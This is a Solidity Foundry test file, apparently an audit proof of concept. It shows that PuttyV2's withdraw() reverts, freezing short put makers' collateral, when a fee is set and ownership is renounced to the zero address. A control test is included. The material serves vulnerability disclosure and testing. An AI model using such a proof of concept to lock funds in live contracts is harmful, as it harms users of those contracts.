pragma solidity 0.8.13;

/*
    ----------------------------------------------------------
    Proof-of-Concept exploit for PuttyV2 “withdraw() ransom” bug
    ----------------------------------------------------------
    Scenario demonstrated:

    1.  Owner sets a non-zero fee, then renounces ownership
        (transferOwnership(address(0))).

    2.  A user acts as the maker of a SHORT PUT order.  
        When the order is filled his strike collateral
        is transferred into PuttyV2.

    3.  After the option has expired the short maker calls
        withdraw() to get his strike back.

    4.  withdraw() tries to skim the fee first:
            ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);
        but ‘owner()’ is now address(0).  
        OpenZeppelin ERC20 implementation forbids transfers
        to the zero address and reverts -> withdraw() reverts,
        user’s collateral is frozen forever.

    The test proves the vulnerability by asserting that the
    withdrawal transaction reverts once ownership has been
    burned, while it succeeds if ownership is kept.
*/

import "forge-std/Test.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "src/PuttyV2.sol";
import "src/lib/IWETH.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/* minimal WETH stub – we never call deposit/withdraw in this PoC
   but the constructor of PuttyV2 needs a non-zero address        */
contract WETHStub is ERC20("WETH", "WETH"), IWETH {
    function deposit() external payable {}
    function withdraw(uint256) external {}
}

contract ExploitTest is Test {
    PuttyV2        putty;
    MockERC20      usdc;      // strike / baseAsset
    WETHStub       weth;

    address owner;            // initial contract owner
    uint256 ownerPk = 0xA0;

    address maker;            // writes the short put
    uint256 makerPk = 0xB0;

    address taker;            // takes the long put
    uint256 takerPk = 0xC0;

    uint256 constant STRIKE  = 100e18;
    uint256 constant FEE_BPS = 10;           // 1 % (precision 1 decimal -> /1000)

    function setUp() public {
        owner = vm.addr(ownerPk);
        maker = vm.addr(makerPk);
        taker  = vm.addr(takerPk);

        // deploy tokens & PuttyV2
        vm.startPrank(owner);
        weth  = new WETHStub();
        usdc  = new MockERC20("Mock USDC" , "mUSDC");
        putty = new PuttyV2("baseURI/", 0 /*fee*/, address(weth));
        vm.stopPrank();

        // give maker his strike collateral
        usdc.mint(maker, STRIKE);
        vm.prank(maker);
        usdc.approve(address(putty), type(uint256).max);

        // owner sets fee and then burns ownership
        vm.startPrank(owner);
        putty.setFee(FEE_BPS);
        putty.transferOwnership(address(0));
        vm.stopPrank();
    }

    // ----------------------------------------------------------
    // The actual exploit – withdraw reverts once ownership == 0
    // ----------------------------------------------------------
    function test_WithdrawRevertsAfterOwnershipBurn() public {
        // ---------------- fill SHORT PUT order -----------------
        PuttyV2.Order memory order = _buildShortPutOrder();

        // maker signs the order (EIP-712)
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerPk, orderHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // taker fills the order -> strike transferred to Putty
        vm.prank(taker);
        putty.fillOrder(order, sig, new uint256[](0));

        // fast-forward beyond option expiry
        vm.warp(block.timestamp + order.duration + 1);

        // -------- short maker tries to withdraw his strike -----
        vm.prank(maker);
        vm.expectRevert();                 // ANY revert is enough for the PoC
        putty.withdraw(order);
    }

    // ----------------------------------------------------------
    // Control test – withdrawal works while owner is NOT burned
    // ----------------------------------------------------------
    function test_WithdrawSucceedsWhileOwnerExists() public {
        // fresh deployment with normal owner
        vm.startPrank(owner);
        PuttyV2 cleanPutty = new PuttyV2("baseURI/", 0, address(weth));
        cleanPutty.setFee(FEE_BPS);        // fee still > 0
        vm.stopPrank();

        // maker collateral & approval
        usdc.mint(maker, STRIKE);
        vm.prank(maker);
        usdc.approve(address(cleanPutty), type(uint256).max);

        // order against cleanPutty
        PuttyV2.Order memory order = _buildShortPutOrder();
        order.baseAsset = address(usdc);

        bytes32 orderHash = cleanPutty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerPk, orderHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        vm.prank(taker);
        cleanPutty.fillOrder(order, sig, new uint256[](0));

        vm.warp(block.timestamp + order.duration + 1);

        // expected to succeed – should emit WithdrawOrder
        vm.prank(maker);
        cleanPutty.withdraw(order);
    }

    // ----------------------------------------------------------
    // Helper – create minimalist SHORT PUT order
    // ----------------------------------------------------------
    function _buildShortPutOrder() internal view returns (PuttyV2.Order memory o) {
        o = PuttyV2.Order({
            maker:       maker,
            isCall:      false,          // PUT
            isLong:      false,          // SHORT
            baseAsset:   address(usdc),
            strike:      STRIKE,
            premium:     0,
            duration:    1 days,
            expiration:  block.timestamp + 30 days,
            nonce:       0,
            whitelist:   new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets:new PuttyV2.ERC721Asset[](0)
        });
    }
}
